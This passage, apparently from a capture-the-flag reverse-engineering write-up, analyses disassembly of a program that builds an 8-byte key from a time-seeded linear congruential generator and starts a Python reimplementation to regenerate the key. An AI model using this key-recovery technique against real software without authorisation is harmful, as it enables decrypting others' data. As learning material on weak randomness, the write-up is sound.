&lt;/span&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E13:&lt;/span&gt; &lt;span class="err"&gt;83&lt;/span&gt; &lt;span class="nf"&gt;C4&lt;/span&gt; &lt;span class="mi"&gt;04&lt;/span&gt;             &lt;span class="nv"&gt;add&lt;/span&gt;         &lt;span class="nb"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E16:&lt;/span&gt; &lt;span class="err"&gt;50&lt;/span&gt;                   &lt;span class="nf"&gt;push&lt;/span&gt;        &lt;span class="nb"&gt;eax&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E17:&lt;/span&gt; &lt;span class="nf"&gt;E8&lt;/span&gt; &lt;span class="mi"&gt;74&lt;/span&gt; &lt;span class="nv"&gt;FF&lt;/span&gt; &lt;span class="nv"&gt;FF&lt;/span&gt; &lt;span class="nv"&gt;FF&lt;/span&gt;       &lt;span class="nv"&gt;call&lt;/span&gt;        &lt;span class="nv"&gt;super_secure_srand&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0631D90h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E1C:&lt;/span&gt; &lt;span class="err"&gt;83&lt;/span&gt; &lt;span class="nf"&gt;C4&lt;/span&gt; &lt;span class="mi"&gt;04&lt;/span&gt;             &lt;span class="nv"&gt;add&lt;/span&gt;         &lt;span class="nb"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E1F:&lt;/span&gt; &lt;span class="nf"&gt;C7&lt;/span&gt; &lt;span class="mi"&gt;45&lt;/span&gt; &lt;span class="nv"&gt;FC&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="nv"&gt;mov&lt;/span&gt;         &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E26:&lt;/span&gt; &lt;span class="nf"&gt;EB&lt;/span&gt; &lt;span class="mi"&gt;09&lt;/span&gt;                &lt;span class="nv"&gt;jmp&lt;/span&gt;         &lt;span class="nv"&gt;generate_key&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;41h&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0631E31h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E28:&lt;/span&gt; &lt;span class="err"&gt;8&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt; &lt;span class="mi"&gt;45&lt;/span&gt; &lt;span class="nv"&gt;FC&lt;/span&gt;             &lt;span class="nv"&gt;mov&lt;/span&gt;         &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E2B:&lt;/span&gt; &lt;span class="err"&gt;83&lt;/span&gt; &lt;span class="nf"&gt;C0&lt;/span&gt; &lt;span class="mi"&gt;01&lt;/span&gt;             &lt;span class="nv"&gt;add&lt;/span&gt;         &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E2E:&lt;/span&gt; &lt;span class="err"&gt;89&lt;/span&gt; &lt;span class="err"&gt;45&lt;/span&gt; &lt;span class="nf"&gt;FC&lt;/span&gt;             &lt;span class="nv"&gt;mov&lt;/span&gt;         &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="nb"&gt;eax&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E31:&lt;/span&gt; &lt;span class="err"&gt;83&lt;/span&gt; &lt;span class="err"&gt;7&lt;/span&gt;&lt;span class="nf"&gt;D&lt;/span&gt; &lt;span class="nv"&gt;FC&lt;/span&gt; &lt;span class="mi"&gt;08&lt;/span&gt;          &lt;span class="nv"&gt;cmp&lt;/span&gt;         &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E35:&lt;/span&gt; &lt;span class="err"&gt;73&lt;/span&gt; &lt;span class="err"&gt;18&lt;/span&gt;                &lt;span class="nf"&gt;jae&lt;/span&gt;         &lt;span class="nv"&gt;generate_key&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;5Fh&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0631E4Fh&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E37:&lt;/span&gt; &lt;span class="nf"&gt;E8&lt;/span&gt; &lt;span class="mi"&gt;84&lt;/span&gt; &lt;span class="nv"&gt;FF&lt;/span&gt; &lt;span class="nv"&gt;FF&lt;/span&gt; &lt;span class="nv"&gt;FF&lt;/span&gt;       &lt;span class="nv"&gt;call&lt;/span&gt;        &lt;span class="nv"&gt;super_secure_random&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0631DC0h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E3C:&lt;/span&gt; &lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;F&lt;/span&gt; &lt;span class="nv"&gt;B6&lt;/span&gt; &lt;span class="nv"&gt;C8&lt;/span&gt;             &lt;span class="nv"&gt;movzx&lt;/span&gt;       &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E3F:&lt;/span&gt; &lt;span class="err"&gt;81&lt;/span&gt; &lt;span class="nf"&gt;E1&lt;/span&gt; &lt;span class="nv"&gt;FF&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;    &lt;span class="nv"&gt;and&lt;/span&gt;         &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0FFh&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E45:&lt;/span&gt; &lt;span class="err"&gt;8&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt; &lt;span class="mi"&gt;55&lt;/span&gt; &lt;span class="mi"&gt;08&lt;/span&gt;             &lt;span class="nv"&gt;mov&lt;/span&gt;         &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E48:&lt;/span&gt; &lt;span class="err"&gt;03&lt;/span&gt; &lt;span class="err"&gt;55&lt;/span&gt; &lt;span class="nf"&gt;FC&lt;/span&gt;             &lt;span class="nv"&gt;add&lt;/span&gt;         &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E4B:&lt;/span&gt; &lt;span class="err"&gt;88&lt;/span&gt; &lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;A&lt;/span&gt;                &lt;span class="nv"&gt;mov&lt;/span&gt;         &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="nb"&gt;cl&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E4D:&lt;/span&gt; &lt;span class="nf"&gt;EB&lt;/span&gt; &lt;span class="nv"&gt;D9&lt;/span&gt;                &lt;span class="nv"&gt;jmp&lt;/span&gt;         &lt;span class="nv"&gt;generate_key&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;38h&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0631E28h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E4F:&lt;/span&gt; &lt;span class="err"&gt;8&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt; &lt;span class="nv"&gt;E5&lt;/span&gt;                &lt;span class="nv"&gt;mov&lt;/span&gt;         &lt;span class="nb"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;ebp&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E51:&lt;/span&gt; &lt;span class="err"&gt;5&lt;/span&gt;&lt;span class="nf"&gt;D&lt;/span&gt;                   &lt;span class="nv"&gt;pop&lt;/span&gt;         &lt;span class="nb"&gt;ebp&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E52:&lt;/span&gt; &lt;span class="nf"&gt;C3&lt;/span&gt;                   &lt;span class="nv"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;Interesting! It seems that the function calls &lt;code&gt;time&lt;/code&gt;, surely to
initialize the seed, as suspected. Then, the function &lt;code&gt;super_secure_srand&lt;/code&gt;
is called. Finally, there seems to be a loop, where the function
&lt;code&gt;super_secure_random&lt;/code&gt; is called (line 23), until &lt;code&gt;eax&lt;/code&gt; is equal to
8 (lines 20, 21, 22). If you remember the execution of the program, the
generated key has a length of 8 bytes. So, the function
&lt;code&gt;super_secure_random&lt;/code&gt; must be used to generate the bytes of the key, one
by one.&lt;/p&gt;
&lt;p&gt;Let's first take a look at the &lt;code&gt;super_secure_srand&lt;/code&gt; function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401d90&lt;/span&gt;      &lt;span class="mi"&gt;55&lt;/span&gt;             &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ebp&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401d91&lt;/span&gt;      &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="nv"&gt;bec&lt;/span&gt;           &lt;span class="nv"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401d93&lt;/span&gt;      &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="nv"&gt;b4508&lt;/span&gt;         &lt;span class="nv"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;arg_8h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;     &lt;span class="c1"&gt;; [0x8:4]=-1 ; 8&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401d96&lt;/span&gt;      &lt;span class="mi"&gt;50&lt;/span&gt;             &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401d97&lt;/span&gt;      &lt;span class="mi"&gt;68&lt;/span&gt;&lt;span class="nv"&gt;e8424000&lt;/span&gt;     &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;str.Seed____d&lt;/span&gt;          &lt;span class="c1"&gt;; 0x4042e8 ; &amp;quot;Seed = %d\n\n&amp;quot;&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401d9c&lt;/span&gt;      &lt;span class="nv"&gt;ff15cc404000&lt;/span&gt;   &lt;span class="nv"&gt;call&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;sym.imp.MSVCR90.dll___iob_func&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; pdb.__imp____iob_func ; 0x4040cc&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401da2&lt;/span&gt;      &lt;span class="mi"&gt;83&lt;/span&gt;&lt;span class="nv"&gt;c040&lt;/span&gt;         &lt;span class="nv"&gt;add&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x40&lt;/span&gt;               &lt;span class="c1"&gt;; &amp;#39;@&amp;#39;&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401da5&lt;/span&gt;      &lt;span class="mi"&gt;50&lt;/span&gt;             &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401da6&lt;/span&gt;      &lt;span class="nv"&gt;ff15c8404000&lt;/span&gt;   &lt;span class="nv"&gt;call&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;sym.imp.MSVCR90.dll_fprintf&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; pdb.__imp__fprintf ; 0x4040c8&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401dac&lt;/span&gt;      &lt;span class="mi"&gt;83&lt;/span&gt;&lt;span class="nv"&gt;c40c&lt;/span&gt;         &lt;span class="nv"&gt;add&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xc&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401daf&lt;/span&gt;      &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="nv"&gt;b4d08&lt;/span&gt;         &lt;span class="nv"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;arg_8h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;     &lt;span class="c1"&gt;; [0x8:4]=-1 ; 8&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401db2&lt;/span&gt;      &lt;span class="mi"&gt;890&lt;/span&gt;&lt;span class="nv"&gt;d2c604000&lt;/span&gt;   &lt;span class="nv"&gt;mov&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x40602c&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;   &lt;span class="c1"&gt;; [0x40602c:4]=0&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401db8&lt;/span&gt;      &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nv"&gt;d&lt;/span&gt;             &lt;span class="nv"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;ebp&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00401db9&lt;/span&gt;      &lt;span class="nv"&gt;c3&lt;/span&gt;             &lt;span class="nv"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It seems to only print the seed message that we saw during the execution. Now,
let's see the function &lt;code&gt;super_secure_random&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DC0:&lt;/span&gt; &lt;span class="err"&gt;55&lt;/span&gt;                   &lt;span class="nf"&gt;push&lt;/span&gt;        &lt;span class="nb"&gt;ebp&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DC1:&lt;/span&gt; &lt;span class="err"&gt;8&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt; &lt;span class="nv"&gt;EC&lt;/span&gt;                &lt;span class="nv"&gt;mov&lt;/span&gt;         &lt;span class="nb"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;esp&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DC3:&lt;/span&gt; &lt;span class="nf"&gt;A1&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nv"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt; &lt;span class="mi"&gt;63&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;       &lt;span class="nv"&gt;mov&lt;/span&gt;         &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;state&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;063602Ch&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DC8:&lt;/span&gt; &lt;span class="err"&gt;69&lt;/span&gt; &lt;span class="nf"&gt;C0&lt;/span&gt; &lt;span class="nv"&gt;FD&lt;/span&gt; &lt;span class="mi"&gt;43&lt;/span&gt; &lt;span class="mi"&gt;03&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;    &lt;span class="nv"&gt;imul&lt;/span&gt;        &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;343FDh&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DCE:&lt;/span&gt; &lt;span class="err"&gt;05&lt;/span&gt; &lt;span class="nf"&gt;C3&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="nv"&gt;E&lt;/span&gt; &lt;span class="mi"&gt;26&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;       &lt;span class="nv"&gt;add&lt;/span&gt;         &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;269EC3h&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DD3:&lt;/span&gt; &lt;span class="nf"&gt;A3&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nv"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt; &lt;span class="mi"&gt;63&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;       &lt;span class="nv"&gt;mov&lt;/span&gt;         &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;state&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;063602Ch&lt;/span&gt;&lt;span class="p"&gt;)],&lt;/span&gt;&lt;span class="nb"&gt;eax&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DD8:&lt;/span&gt; &lt;span class="nf"&gt;A1&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nv"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt; &lt;span class="mi"&gt;63&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;       &lt;span class="nv"&gt;mov&lt;/span&gt;         &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;state&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;063602Ch&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DDD:&lt;/span&gt; &lt;span class="nf"&gt;C1&lt;/span&gt; &lt;span class="nv"&gt;F8&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;             &lt;span class="nv"&gt;sar&lt;/span&gt;         &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;10h&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DE0:&lt;/span&gt; &lt;span class="err"&gt;25&lt;/span&gt; &lt;span class="nf"&gt;FF&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="nv"&gt;F&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;       &lt;span class="nv"&gt;and&lt;/span&gt;         &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;7FFFh&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DE5:&lt;/span&gt; &lt;span class="err"&gt;5&lt;/span&gt;&lt;span class="nf"&gt;D&lt;/span&gt;                   &lt;span class="nv"&gt;pop&lt;/span&gt;         &lt;span class="nb"&gt;ebp&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DE6:&lt;/span&gt; &lt;span class="nf"&gt;C3&lt;/span&gt;                   &lt;span class="nv"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There seems to be a pointer to a variable &lt;code&gt;state&lt;/code&gt;. Here are the
operations:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;The content of this &lt;code&gt;state&lt;/code&gt; variable is copied to &lt;code&gt;eax&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;eax&lt;/code&gt; is multiplied by 0x343FD, and the result is stored in
&lt;code&gt;eax&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;0x269EC3 is added to &lt;code&gt;eax&lt;/code&gt;, and the result is stored in &lt;code&gt;eax&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;This value is stored in the &lt;code&gt;state&lt;/code&gt; variable.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;eax&lt;/code&gt; is shifted by 0x10 bits to the right.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;eax&lt;/code&gt; is bit-&lt;code&gt;AND&lt;/code&gt;-ed with 0x7FFF.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This function is first called with the Unix timestamp as a seed, and is then
called seven more times to generate the full key. It took a bit of dynamic
analysis with Visual Studio's debugger to understand what was being done.&lt;/p&gt;
&lt;p&gt;Here's an implementation of the key generation in python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;generate_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seed&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;bytearray&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;seed&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key_byte&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;super_secure_random&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seed&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key_byte&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xFF&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;super_secure_random&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seed&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;seed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;seed&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xFFFFFFFF&lt;/span&gt;

